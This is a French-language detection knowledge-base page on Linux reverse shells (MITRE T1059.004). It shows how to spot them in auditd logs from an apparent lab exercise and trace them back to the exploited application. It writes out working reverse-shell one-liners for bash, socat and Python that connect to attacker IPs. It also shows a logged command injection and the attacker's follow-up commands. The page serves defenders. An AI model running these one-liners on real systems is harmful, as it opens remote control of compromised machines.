---
title: "Reverse shell"
description: "Après une exploitation, l'attaquant fait se connecter la victime à sa machine pour obtenir un vrai terminal : le signe qu'un humain est en train de poursuivre l'attaque."
tags: [linux, reverse-shell, auditd, socat]
updated: 2026-11-19
draft: false
type: technique
attack_id: T1059.004
tactic: execution
severity: crit
platforms: [Linux]
data_sources: [auditd]
related:
  - 03-menaces-detection/initial-access/exploitation-application-publique
  - 03-menaces-detection/privilege-escalation/elevation-de-privileges-linux
---

## Description

Entré par SSH, l'attaquant a un terminal confortable. Entré par un exploit ou une faille web, il subit des limites : sortie des commandes déformée, délais et coupures, limites de débit, restrictions réseau, pas de Ctrl+C. Pour s'en libérer, il ouvre un **reverse shell** : une session de la victime vers sa machine, souvent la seule façon de poursuivre l'attaque.

| Outil | Commande lancée sur la victime |
| --- | --- |
| bash | `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` : la victime se connecte à 10.10.10.10:1337 et y lance `bash` pour l'attaquant. |
| socat | `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` : même chose, l'attaquant écoute sur 10.20.20.20:2525. |
| Python | `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` : même chose, l'attaquant écoute sur 10.30.30.30:80. |

Un reverse shell est en général traité comme une **alerte critique** : la machine est déjà compromise, et un attaquant humain est en train de prendre la main. La suite (découverte, élévation de privilèges, persistance) part de ce shell.

## Ce qu'on observe

Dans auditd, la commande du reverse shell, lancée par l'application exploitée :

```text title="socat lancé par /bin/sh, lui-même lancé par l'application TryPingMe"
root@thm-vm:~$ ausearch -i -x socat
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27806
type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27796
type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py
type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
```

Puis tout ce que l'attaquant tape dans ce shell, enfants du processus du reverse shell :

```text title="les commandes passées dans le reverse shell"
root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle
type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id
type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a
type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .
```

## Détection

### auditd

:::etapes
1. **Trouver le reverse shell**
   `ausearch -i -x socat` (ou `bash`, `python3`) : une commande qui contient une IP et un port.
2. **Trouver son origine**
   `ausearch -i --pid <ppid>`, en remontant jusqu'à l'application exploitée.
3. **Lister ce que l'attaquant a fait**
   `ausearch -i --ppid <pid du reverse shell> | grep proctitle`.
:::

Méthode détaillée : [remonter l'arbre des processus](../../01-fondamentaux/journaux-linux.md#remonter-larbre-des-processus).

## Faux positifs

À compléter.

## Réponse

À compléter.
